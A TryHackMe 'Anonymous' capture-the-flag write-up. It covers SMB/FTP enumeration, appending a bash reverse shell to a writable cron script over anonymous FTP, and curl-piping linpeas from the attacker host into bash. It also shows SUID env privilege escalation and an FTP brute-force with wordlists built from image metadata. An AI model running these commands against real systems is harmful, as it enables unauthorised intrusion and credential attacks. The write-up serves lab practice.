---
render_with_liquid: false
title: Anonymous
date: 2023-07-28 15:59:12 +1400
tags: [tryhackme, nmap, linux, crackmapexec, smbclient, smbget, ftp, file-write, bash-script, scheduled-job-abuse, linpeas, suid, lxd]
---




# Recon
---
Add to hosts

```bash
writehosts thm '10.10.250.142 anonymous.thm'
```


## CrackMapExec

```bash
┌──(bravosec㉿fsociety)-[~/thm/Anonymous]
└─$ cme smb anonymous.thm -u '' -p ''
SMB         anonymous.thm   445    ANONYMOUS        [*] Windows 6.1 (name:ANONYMOUS) (domain:) (signing:False) (SMBv1:True)
SMB         anonymous.thm   445    ANONYMOUS        [+] \:

┌──(bravosec㉿fsociety)-[~/thm/Anonymous]
└─$ cme smb anonymous.thm -u 'a' -p ''
SMB         anonymous.thm   445    ANONYMOUS        [*] Windows 6.1 (name:ANONYMOUS) (domain:) (signing:False) (SMBv1:True)
SMB         anonymous.thm   445    ANONYMOUS        [+] \a:
```


### Shares

```bash
┌──(bravosec㉿fsociety)-[~/thm/Anonymous]
└─$ cme smb anonymous.thm -u 'a' -p '' --shares
SMB         anonymous.thm   445    ANONYMOUS        [*] Windows 6.1 (name:ANONYMOUS) (domain:) (signing:False) (SMBv1:True)
SMB         anonymous.thm   445    ANONYMOUS        [+] \a:
SMB         anonymous.thm   445    ANONYMOUS        [-] Neo4J does not seem to be available on bolt://127.0.0.1:7687.
SMB         anonymous.thm   445    ANONYMOUS        [*] Enumerated shares
SMB         anonymous.thm   445    ANONYMOUS        Share           Permissions     Remark
SMB         anonymous.thm   445    ANONYMOUS        -----           -----------     ------
SMB         anonymous.thm   445    ANONYMOUS        print$                          Printer Drivers
SMB         anonymous.thm   445    ANONYMOUS        pics            READ            My SMB Share Directory for Pics
SMB         anonymous.thm   445    ANONYMOUS        IPC$                            IPC Service (anonymous server (Samba, Ubuntu))
```


### Users

```bash
┌──(bravosec㉿fsociety)-[~/thm/Anonymous]
└─$ cme smb anonymous.thm -u '' -p '' --users
SMB         anonymous.thm   445    ANONYMOUS        [*] Windows 6.1 (name:ANONYMOUS) (domain:) (signing:False) (SMBv1:True)
SMB         anonymous.thm   445    ANONYMOUS        [+] \:
SMB         anonymous.thm   445    ANONYMOUS        [-] Neo4J does not seem to be available on bolt://127.0.0.1:7687.
SMB         anonymous.thm   445    ANONYMOUS        [*] Trying to dump local users with SAMRPC protocol
SMB         anonymous.thm   445    ANONYMOUS        [+] Enumerated domain user(s)
SMB         anonymous.thm   445    ANONYMOUS        \namelessone
```


### Password Policies

```bash
┌──(bravosec㉿fsociety)-[~/thm/Anonymous]
└─$ cme smb anonymous.thm -u '' -p '' --pass-pol
SMB         anonymous.thm   445    ANONYMOUS        [*] Windows 6.1 (name:ANONYMOUS) (domain:) (signing:False) (SMBv1:True)
SMB         anonymous.thm   445    ANONYMOUS        [+] \:
SMB         anonymous.thm   445    ANONYMOUS        [-] Neo4J does not seem to be available on bolt://127.0.0.1:7687.
SMB         anonymous.thm   445    ANONYMOUS        [+] Dumping password info for domain: ANONYMOUS
SMB         anonymous.thm   445    ANONYMOUS        Minimum password length: 5
SMB         anonymous.thm   445    ANONYMOUS        Password history length: None
SMB         anonymous.thm   445    ANONYMOUS        Maximum password age: 37 days 6 hours 21 minutes
SMB         anonymous.thm   445    ANONYMOUS
SMB         anonymous.thm   445    ANONYMOUS        Password Complexity Flags: 000000
SMB         anonymous.thm   445    ANONYMOUS            Domain Refuse Password Change: 0
SMB         anonymous.thm   445    ANONYMOUS            Domain Password Store Cleartext: 0
SMB         anonymous.thm   445    ANONYMOUS            Domain Password Lockout Admins: 0
SMB         anonymous.thm   445    ANONYMOUS            Domain Password No Clear Change: 0
SMB         anonymous.thm   445    ANONYMOUS            Domain Password No Anon Change: 0
SMB         anonymous.thm   445    ANONYMOUS            Domain Password Complex: 0
SMB         anonymous.thm   445    ANONYMOUS
SMB         anonymous.thm   445    ANONYMOUS        Minimum password age: None
SMB         anonymous.thm   445    ANONYMOUS        Reset Account Lockout Counter: 30 minutes
SMB         anonymous.thm   445    ANONYMOUS        Locked Account Duration: 30 minutes
SMB         anonymous.thm   445    ANONYMOUS        Account Lockout Threshold: None
SMB         anonymous.thm   445    ANONYMOUS        Forced Log off Time: 37 days 6 hours 21 minutes
```


## Nmap

```bash

# Nmap 7.94 scan initiated Fri Jul 28 15:59:12 2023 as: nmap -sVC -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p- anonymous.thm
Increasing send delay for 10.10.250.142 from 0 to 5 due to 1508 out of 3769 dropped probes since last increase.
Increasing send delay for 10.10.250.142 from 5 to 10 due to 11 out of 26 dropped probes since last increase.
Nmap scan report for anonymous.thm (10.10.250.142)
Host is up, received user-set (0.28s latency).
Scanned at 2023-07-28 15:59:12 CST for 976s
Not shown: 65531 closed tcp ports (reset)
PORT    STATE SERVICE     REASON         VERSION
21/tcp  open  ftp         syn-ack ttl 63 vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.11.19.145
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp  open  ssh         syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDCi47ePYjDctfwgAphABwT1jpPkKajXoLvf3bb/zvpvDvXwWKnm6nZuzL2HA1veSQa90ydSSpg8S+B8SLpkFycv7iSy2/Jmf7qY+8oQxWThH1fwBMIO5g/TTtRRta6IPoKaMCle8hnp5pSP5D4saCpSW3E5rKd8qj3oAj6S8TWgE9cBNJbMRtVu1+sKjUy/7ymikcPGAjRSSaFDroF9fmGDQtd61oU5waKqurhZpre70UfOkZGWt6954rwbXthTeEjf+4J5+gIPDLcKzVO7BxkuJgTqk4lE9ZU/5INBXGpgI5r4mZknbEPJKS47XaOvkqm9QWveoOSQgkqdhIPjnhD
|   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPjHnAlR7sBuoSM2X5sATLllsFrcUNpTS87qXzhMD99aGGzyOlnWmjHGNmm34cWSzOohxhoK2fv9NWwcIQ5A/ng=
|   256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDHIuFL9AdcmaAIY7u+aJil1covB44FA632BSQ7sUqap
139/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  0,i V      syn-ack ttl 63 Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   ANONYMOUS<00>        Flags: <unique><active>
|   ANONYMOUS<03>        Flags: <unique><active>
|   ANONYMOUS<20>        Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_clock-skew: mean: 2s, deviation: 0s, median: 1s
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 18380/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 38786/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 35829/udp): CLEAN (Failed to receive data)
|   Check 4 (port 36586/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time:
|   date: 2023-07-28T08:15:21
|_  start_date: N/A
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: anonymous
|   NetBIOS computer name: ANONYMOUS\x00
|   Domain name: \x00
|   FQDN: anonymous
|_  System time: 2023-07-28T08:15:21+00:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Fri Jul 28 16:15:28 2023 -- 1 IP address (1 host up) scanned in 976.47 seconds
```


# Exploit
---

## Enum SMB Share

```bash
┌──(bravosec㉿fsociety)-[~/thm/Anonymous]
└─$ cme smb anonymous.thm -u 'a' -p '' -M spider_plus
SMB         anonymous.thm   445    ANONYMOUS        [*] Windows 6.1 (name:ANONYMOUS) (domain:) (signing:False) (SMBv1:True)
SMB         anonymous.thm   445    ANONYMOUS        [+] \a:
SMB         anonymous.thm   445    ANONYMOUS        [-] Neo4J does not seem to be available on bolt://127.0.0.1:7687.
SPIDER_P... anonymous.thm   445    ANONYMOUS        [*] Started spidering plus with option:
SPIDER_P... anonymous.thm   445    ANONYMOUS        [*]        DIR: ['print$', 'ipc$']
SPIDER_P... anonymous.thm   445    ANONYMOUS        [*]        EXT: ['ico', 'lnk']
SPIDER_P... anonymous.thm   445    ANONYMOUS        [*]       SIZE: 51200
SPIDER_P... anonymous.thm   445    ANONYMOUS        [*]     OUTPUT: /tmp/cme_spider_plus

┌──(bravosec㉿fsociety)-[~/thm/Anonymous]
└─$ jq . /tmp/cme_spider_plus/anonymous.thm.json
{
  "pics": {
    "corgo2.jpg": {
      "atime_epoch": "2023-07-28 15:26:31",
      "ctime_epoch": "2020-05-12 08:43:42",
      "mtime_epoch": "2020-05-12 08:43:42",
      "size": "41.66 KB"
    },
    "puppos.jpeg": {
      "atime_epoch": "2023-07-28 15:26:33",
      "ctime_epoch": "2020-05-12 08:43:42",
      "mtime_epoch": "2020-05-12 08:43:42",
      "size": "258.97 KB"
    }
  }
}
```

> Dumping Files is not reliable via CrackMapExec, some files failed to download compare to smbclient
> ```bash
> cme smb anonymous.thm -u 'a' -p '' -M spider_plus -o READ_ONLY=false OUTPUT=./loot/smb/
> ```
{: .prompt-warning }

Download all files

```bash
┌──(bravosec㉿fsociety)-[~/thm/Anonymous]
└─$ mkdir -p loot/smb/pics && cd loot/smb/pics

┌──(bravosec㉿fsociety)-[~/thm/Anonymous/loot/smb/pics]
└─$ smbget -U a -R smb://anonymous.thm/pics/
Password for [a] connecting to //anonymous.thm/pics:
Using workgroup WORKGROUP, user a
smb://anonymous.thm/pics//corgo2.jpg
smb://anonymous.thm/pics//puppos.jpeg
Downloaded 300.64kB in 11 seconds
```


## Enum FTP

```bash
┌──(bravosec㉿fsociety)-[~/thm/Anonymous]
└─$ ftp ftp://anonymous:''@anonymous.thm
Connected to anonymous.thm.
220 NamelessOne's FTP Server!
331 Please specify the password.
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
200 Switching to Binary mode.

ftp> ls -la
229 Entering Extended Passive Mode (|||61321|)
150 Here comes the directory listing.
drwxr-xr-x    3 65534    65534        4096 May 13  2020 .
drwxr-xr-x    3 65534    65534        4096 May 13  2020 ..
drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts
226 Directory send OK.

ftp> cd scripts
250 Directory successfully changed.

ftp> ls -la
229 Entering Extended Passive Mode (|||44195|)
150 Here comes the directory listing.
drwxrwxrwx    2 111      113          4096 Jun 04  2020 .
drwxr-xr-x    3 65534    65534        4096 May 13  2020 ..
-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh
-rw-rw-r--    1 1000     1000         2451 Jul 28 07:36 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
226 Directory send OK.
```

```bash
mkdir -p loot/ftp && cd loot/ftp
wget -m ftp://anonymous:''@anonymous.thm
```

```bash
┌──(bravosec㉿fsociety)-[~/…/Anonymous/loot/ftp/anonymous.thm/scripts]
└─$ cat clean.sh

#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi

┌──(bravosec㉿fsociety)-[~/…/Anonymous/loot/ftp/anonymous.thm/scripts]
└─$ cat to_do.txt
I really need to disable the anonymous login...it's really not safe
```


## Initial Access as namelessone


### Arbitrary File Write On FTP

From nmap result

```bash
|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]
```

I guess `clean.sh` have something like cronjob setup to run as task

```bash
┌──(bravosec㉿fsociety)-[~/thm/Anonymous/loot/ftp]
└─$ echo 'bash -i >& /dev/tcp/10.11.19.145/1111 0>&1' >> clean.sh
```

```bash
┌──(bravosec㉿fsociety)-[~/…/loot/ftp/anonymous.thm/scripts]
└─$ ftp ftp://anonymous:''@anonymous.thm
Connected to anonymous.thm.
220 NamelessOne's FTP Server!
331 Please specify the password.
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
200 Switching to Binary mode.

ftp> cd scripts
250 Directory successfully changed.

ftp> put clean.sh
local: clean.sh remote: clean.sh
229 Entering Extended Passive Mode (|||14599|)
150 Ok to send data.
100% |***********************************************************|   377       12.39 MiB/s    00:00 ETA
226 Transfer complete.
377 bytes sent in 00:00 (0.65 KiB/s)
```

Got the shell in 1 minute

```bash
┌──(bravosec㉿fsociety)-[~/thm/Anonymous]
└─$ nc -lvnp 1111
listening on [any] 1111 ...
connect to [10.11.19.145] from (UNKNOWN) [10.10.250.142] 59992
bash: cannot set terminal process group (11515): Inappropriate ioctl for device
bash: no job control in this shell
namelessone@anonymous:~$ id
id
uid=1000(namelessone) gid=1000(namelessone) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
namelessone@anonymous:~$ cat user.txt
90d6f992585815ff991e68748c414740
```


## From namelessone to root

Stabilize Shell

```bash
namelessone@anonymous:~$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
namelessone@anonymous:~$ ^Z
zsh: suspended  nc -lvnp 1111

┌──(bravosec㉿fsociety)-[~/thm/Anonymous]
└─$ stty raw -echo;fg
[1]  + continued  nc -lvnp 1111

namelessone@anonymous:~$ export TERM=xterm
namelessone@anonymous:~$ 
```


#### linpeas.sh - brute force su with common passwords

Supply/pass arguments while using curl to pipe linpeas to bash from remote 

```bash
curl 10.11.19.145/linpeas.sh|bash -s -- -a
```


### Abuse env whith SUID

```bash
find / -type f -perm -4000 -ls 2>/dev/null
```

![](/assets/obsidian/a808ac60a6830c89b34f15f5447911ce.png)

> https://gtfobins.github.io/gtfobins/env/#suid

```bash
namelessone@anonymous:~$ /usr/bin/env /bin/sh -p

# id
uid=1000(namelessone) gid=1000(namelessone) euid=0(root) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)

# cat /root/root.txt
4d930091c31a622a7ed10f27999af363
```


# Additional
---

## Failed Attempts


### Try to privilege escalate via Pkexec

![](/assets/obsidian/ae9af7e3733a06508191f58fa61d6837.png)

> https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#pe-method-2

> This method requires user's password
{: .prompt-tip }


### Gather username and generate wordlist to brute force

> Extended research from [[Anonymous]]


#### Interesting Data from image

The info was extracted from **magick** : `puppos.jpeg`

```bash
Artist: Photographer: Tatyana Panova

ImageDescription: Three Pembroke Welsh Corgis side by side outdoors. Approved by Denise Flaim September 2018 and Susan Sprung..Adobe Stock #118102236
```


#### Gather User Names

```bash
┌──(bravosec㉿fsociety)-[~/thm/Anonymous]
└─$ cat usernames.txt
Denise Flaim
Susan Sprung
Tatyana Panova

┌──(bravosec㉿fsociety)-[~/thm/Anonymous]
└─$ /opt/sectools/misc/username-anarchy/username-anarchy -i usernames.txt > users.txt
```

Insert username gathered from smb 

```bash
┌──(bravosec㉿fsociety)-[~/thm/Anonymous]
└─$ echo 'namelessone' >> users.txt
```


#### Generate Password Wordlist


##### Use CUPP

Notable keywords:

```bash
Denise,Flaim,September,2018,Susan,Sprung,9,09
```

Info gathered:

```bash
> First Name: Tatyana
> Surname: Panova
> Company name: Hewlett-Packard
```

```bash
┌──(bravosec㉿fsociety)-[/opt/sectools/password-attacks/cupp]
└─$ python3 cupp.py -i
 ___________
   cupp.py!                 # Common
      \                     # User
       \   ,__,             # Passwords
        \  (oo)____         # Profiler
           (__)    )\
              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
                            [ Mebus | https://github.com/Mebus/]


[+] Insert the information about the victim to make a dictionary
[+] If you don't know all the info, just hit enter when asked! ;)

> First Name: Tatyana
> Surname: Panova
> Nickname:
> Birthdate (DDMMYYYY):


> Partners) name:
> Partners) nickname:
> Partners) birthdate (DDMMYYYY):


> Child's name:
> Child's nickname:
> Child's birthdate (DDMMYYYY):


> Pet's name:
> Company name: Hewlett-Packard


> Do you want to add some key words about the victim? Y/[N]: Y
> Please enter the words, separated by comma. [i.e. hacker,juice,black], spaces will be removed: Denise,Flaim,September,2018,Susan,Sprung,9,09
> Do you want to add special chars at the end of words? Y/[N]:
> Do you want to add some random numbers at the end of words? Y/[N]:
> Leet mode? (i.e. leet = 1337) Y/[N]:

[+] Now making a dictionary...
[+] Sorting list and removing duplicates...
[+] Saving dictionary to tatyana.txt, counting 671 words.
> Hyperspeed Print? (Y/n) :
[+] Now load your pistolero with tatyana.txt and shoot! Good luck!
```

Move to wordlists dir

```bash
mv tatyana.txt /opt/wordlists/custom/cupp_tatyana.txt
```


##### Extract keywords from image metadata

Put interesting words in `/opt/wordlists/custom/keywords.txt`

```bash
/opt/sectools/ctf/Steganography/magick identify -verbose puppos.jpeg|cut -d ":" -f2-
```

![](/assets/obsidian/1cd059c82d0041fb2d4ec8671e91f6da.png)

```bash
vi /opt/wordlists/custom/keywords.txt
```


##### Merge and remove duplicates

Merage two wordlists

```bash
┌──(bravosec㉿fsociety)-[/opt/wordlists/custom]
└─$ cat keywords.txt cupp_tatyana.txt > merged.txt
```

Remove duplicate lines in wordlist

```bash
┌──(bravosec㉿fsociety)-[/opt/wordlists/custom]
└─$ /opt/sectools/password-attacks/duplicut/duplicut final.txt -o real_final.txt

duplicut successfully removed 3 duplicates and 1 filtered lines in 00 seconds
```

#### Brute Force

Targeted **ftp** because it's faster than SMB

```bash
hydra -L users.txt -P /opt/wordlists/custom/real_final.txt -e nsr ftp://anonymous.thm -t 50 -I -vV
```

> No a valid result, they are basally invalid usernames except the one from smb share

> This is a good practice material though

## Analyze Images from smb share

> https://book.hacktricks.xyz/crypto-and-stego/stego-tricks

> When it comes to Steganography, use these : `file`, `diec` , `exiv2`, `binwalk`, `foremost`, `zsteg`, `stegseek`, `magick`, `stegsolve`, `exiftool`
{: .prompt-tip }


### File

```bash
┌──(bravosec㉿fsociety)-[~/thm/Anonymous/loot/smb]
└─$ ls
corgo2.jpg  puppos.jpeg

┌──(bravosec㉿fsociety)-[~/thm/Anonymous/loot/smb]
└─$ file corgo2.jpg
corgo2.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 800x533, components 3

┌──(bravosec㉿fsociety)-[~/thm/Anonymous/loot/smb]
└─$ file puppos.jpeg
puppos.jpeg: JPEG image data, Exif standard: [TIFF image data, little-endian, direntries=19, height=3744, bps=242, PhotometricInterpretation=RGB, description=Three Pembroke Welsh Corgis side by side outdoors. Approved by Denise Flaim September 2018 and Susan Sprung., manufacturer=Canon, model=Canon EOS 5D Mark II, orientation=upper-left, width=5616], progressive, precision 8, 600x400, components 3
```


### Detect It Easy

```bash
┌──(bravosec㉿fsociety)-[~/…/Anonymous/loot/smb/pics]
└─$ diec corgo2.jpg
Binary
    Image: JPEG(1.01)[800x533,YCbCr]
    Tool: FlashPix/ICC
    Image: DQT[eda1acdf05eb5c1bdb3664b199d77227]


┌──(bravosec㉿fsociety)-[~/…/Anonymous/loot/smb/pics]
└─$ diec puppos.jpeg
Binary
    Image: JPEG(0.073)[EXIF]
    camera: Canon(Canon EOS 5D Mark II)
    Tool: FlashPix/ICC
    Tool: Photoshop
    Tool: Adobe
    Image: DQT[5379e0133d4439b6f7c7039fc7f7734f]
```


### Exiv2

exiv2 extracts less info compare to exiftool but better for read

```bash
┌──(bravosec㉿fsociety)-[~/thm/Anonymous/loot/smb]
└─$ exiv2 puppos.jpeg
File name       : puppos.jpeg
File size       : 265188 Bytes
MIME type       : image/jpeg
Image size      : 600 x 400
Thumbnail       : image/jpeg, 5751 Bytes
Camera make     : Canon
Camera model    : Canon EOS 5D Mark II
Image timestamp : 2016:07:23 08:59:38
File number     :
Exposure time   : 1/250 s
Aperture        : F2.8
Exposure bias   : 0 EV
Flash           : No, compulsory
Flash bias      :
Focal length    : 135.0 mm
Subject distance:
ISO speed       : 125
Exposure mode   : Manual
Metering mode   : Multi-segment
Macro mode      :
Image quality   :
White balance   : Manual
Copyright       : Tatyana Panova
www.tpanova.ru
Exif comment    :


┌──(bravosec㉿fsociety)-[~/thm/Anonymous/loot/smb]
└─$ exiv2 corgo2.jpg
File name       : corgo2.jpg
File size       : 42663 Bytes
MIME type       : image/jpeg
Image size      : 800 x 533
corgo2.jpg: No Exif data found in the file
```


### Binwalk

```bash
┌──(bravosec㉿fsociety)-[~/thm/Anonymous/loot/smb]
└─$ binwalk puppos.jpeg

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, EXIF standard
12            0xC             TIFF image data, little-endian offset of first image directory: 8
28229         0x6E45          Copyright string: "Copyright (c) 1998 Hewlett-Packard Company"

┌──(bravosec㉿fsociety)-[~/thm/Anonymous/loot/smb]
└─$ binwalk corgo2.jpg

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, JFIF standard 1.01
```


### Stegseek

```bash
┌──(bravosec㉿fsociety)-[~/thm/Anonymous/loot/smb]
└─$ stegseek -sf puppos.jpeg
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Progress: 99.32% (132.5 MB)
[!] error: Could not find a valid passphrase.

┌──(bravosec㉿fsociety)-[~/thm/Anonymous/loot/smb]
└─$ stegseek -sf corgo2.jpg
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Progress: 98.81% (131.8 MB)
[!] error: Could not find a valid passphrase.
```


### Strings

```bash
strings -n 6 corgo2.jpg| grep -iE "pass|cred|user"
strings -n 6 puppos.jpeg| grep -iE "pass|cred|user"
```


### Image Magick

```bash
┌──(bravosec㉿fsociety)-[~/thm/Anonymous/loot/smb]
└─$ /opt/sectools/ctf/Steganography/magick identify -verbose corgo2.jpg
Image:
  Filename: corgo2.jpg
  Permissions: rwxr-xr-x
  Format: JPEG (Joint Photographic Experts Group JFIF format)
  Mime type: image/jpeg
  Class: DirectClass
  Geometry: 800x533+0+0
  Units: Undefined
  Colorspace: sRGB
  Type: TrueColor
  Base type: Undefined
  Endianness: Undefined
  Depth: 8-bit
  Channels: 3.0
  Channel depth:
    Red: 8-bit
    Green: 8-bit
    Blue: 8-bit
  Channel statistics:
    Pixels: 426400
    Red:
      min: 0  (0)
      max: 255 (1)
      mean: 145.343 (0.569973)
      median: 164 (0.643137)
      standard deviation: 73.5031 (0.288247)
      kurtosis: -1.08162
      skewness: -0.425436
      entropy: 0.97955
    Green:
      min: 0  (0)
      max: 255 (1)
      mean: 141.724 (0.55578)
      median: 145 (0.568627)
      standard deviation: 66.8634 (0.262209)
      kurtosis: -0.972326
      skewness: -0.131108
      entropy: 0.985249
    Blue:
      min: 0  (0)
      max: 255 (1)
      mean: 124.777 (0.489323)
      median: 120 (0.470588)
      standard deviation: 76.934 (0.301702)
      kurtosis: -1.24114
      skewness: 0.159572
      entropy: 0.986467
  Image statistics:
    Overall:
      min: 0  (0)
      max: 255 (1)
      mean: 137.281 (0.538359)
      median: 143 (0.560784)
      standard deviation: 72.4335 (0.284053)
      kurtosis: -1.17269
      skewness: -0.143843
      entropy: 0.983755
  Rendering intent: Perceptual
  Gamma: 0.454545
  Chromaticity:
    red primary: (0.64,0.33,0.03)
    green primary: (0.3,0.6,0.1)
    blue primary: (0.15,0.06,0.79)
    white point: (0.3127,0.329,0.3583)
  Matte color: grey74
  Background color: white
  Border color: srgb(223,223,223)
  Transparent color: black
  Interlace: None
  Intensity: Undefined
  Compose: Over
  Page geometry: 800x533+0+0
  Dispose: Undefined
  Iterations: 0
  Compression: JPEG
  Quality: 50
  Orientation: Undefined
  Profiles:
    Profile-icc: 524 bytes
  Properties:
    date:create: 2023-07-28T07:56:45+00:00
    date:modify: 2023-07-28T07:56:45+00:00
    date:timestamp: 2023-07-28T08:22:26+00:00
    icc:copyright: FB
    icc:description: c2
    jpeg:colorspace: 2
    jpeg:sampling-factor: 2x2,1x1,1x1
    signature: 9c73aa39f410d05155e96fb8dd3d50ec9ab59b5020cd6dfed7b889f47e8b44ba
  Artifacts:
    verbose: true
  Tainted: False
  Filesize: 42663B
  Number pixels: 426400
  Pixel cache type: Memory
  Pixels per second: 35.5932MP
  User time: 0.000u
  Elapsed time: 0:01.011
  Version: ImageMagick 7.1.1-14 Q16-HDRI x86_64 e284d8387:20230722 https://imagemagick.org

┌──(bravosec㉿fsociety)-[~/thm/Anonymous/loot/smb]
└─$ /opt/sectools/ctf/Steganography/magick identify -verbose puppos.jpeg
Image:
  Filename: puppos.jpeg
  Permissions: rwxr-xr-x
  Format: JPEG (Joint Photographic Experts Group JFIF format)
  Mime type: image/jpeg
  Class: DirectClass
  Geometry: 600x400+0+0
  Resolution: 300x300
  Print size: 2x1.33333
  Units: PixelsPerInch
  Colorspace: sRGB
  Type: TrueColor
  Base type: Undefined
  Endianness: Undefined
  Depth: 8-bit
  Channels: 3.0
  Channel depth:
    Red: 8-bit
    Green: 8-bit
    Blue: 8-bit
  Channel statistics:
    Pixels: 240000
    Red:
      min: 0  (0)
      max: 255 (1)
      mean: 125.008 (0.490226)
      median: 122 (0.478431)
      standard deviation: 70.1468 (0.275086)
      kurtosis: -1.08354
      skewness: 0.130755
      entropy: 0.982102
    Green:
      min: 0  (0)
      max: 255 (1)
      mean: 138.355 (0.54257)
      median: 140 (0.54902)
      standard deviation: 61.4647 (0.241038)
      kurtosis: -0.827955
      skewness: -0.0376125
      entropy: 0.970922
    Blue:
      min: 0  (0)
      max: 255 (1)
      mean: 60.9062 (0.238848)
      median: 38 (0.14902)
      standard deviation: 59.9065 (0.234927)
      kurtosis: 0.575611
      skewness: 1.24327
      entropy: 0.913399
  Image statistics:
    Overall:
      min: 0  (0)
      max: 255 (1)
      mean: 108.09 (0.423881)
      median: 100 (0.392157)
      standard deviation: 63.8393 (0.25035)
      kurtosis: -1.08047
      skewness: 0.277787
      entropy: 0.955474
  Rendering intent: Perceptual
  Gamma: 0.454545
  Chromaticity:
    red primary: (0.64,0.33,0.03)
    green primary: (0.3,0.6,0.1)
    blue primary: (0.15,0.06,0.79)
    white point: (0.3127,0.329,0.3583)
  Matte color: grey74
  Background color: white
  Border color: srgb(223,223,223)
  Transparent color: black
  Interlace: JPEG
  Intensity: Undefined
  Compose: Over
  Page geometry: 600x400+0+0
  Dispose: Undefined
  Iterations: 0
  Compression: JPEG
  Quality: 99
  Orientation: TopLeft
  Profiles:
    Profile-8bim: 9236 bytes
    Profile-exif: 6979 bytes
    Profile-icc: 3144 bytes
    Profile-iptc: 1110 bytes
      City[1,90]: 0x00000000: 254700                                        -%G
      unknown[1,0]:
      unknown[2,0]:
      Caption[2,120]: Three Pembroke Welsh Corgis side by side outdoors. Approved by Denise Flaim September 2018 and Susan Sprung.
      Byline[2,80]: Photographer: Tatyana Panova
      Credit[2,110]: tanipanova - stock.adobe.com
      Src[2,115]: 118102236
      Image Name[2,5]: Three dogs of welsh corgi pembroke breed with white and red coat
      Created Date[2,55]: 20160723
      Created Time[2,60]: 085938+0000
      Country[2,101]: Russian Federation
      Keyword[2,25]: animal
      Keyword[2,25]: dog
      Keyword[2,25]: pembroke
      Keyword[2,25]: corgi
      Keyword[2,25]: welsh
      Keyword[2,25]: cute
      Keyword[2,25]: canine
      Keyword[2,25]: happy
      Keyword[2,25]: breed
      Keyword[2,25]: portrait
      Keyword[2,25]: pedigree
      Keyword[2,25]: grass
      Keyword[2,25]: posing
      Keyword[2,25]: outdoor
      Keyword[2,25]: happiness
      Keyword[2,25]: nature
      Keyword[2,25]: friend
      Keyword[2,25]: green
      Keyword[2,25]: funny
      Keyword[2,25]: summer
      Keyword[2,25]: beautiful
      Keyword[2,25]: looking
      Keyword[2,25]: color
      Keyword[2,25]: purebred
      Keyword[2,25]: adorable
      Keyword[2,25]: playing
      Keyword[2,25]: brown
      Keyword[2,25]: smile
      Keyword[2,25]: smiling
      Keyword[2,25]: fun
      Keyword[2,25]: standing
      Keyword[2,25]: small
      Keyword[2,25]: friendly
      Keyword[2,25]: cheerful
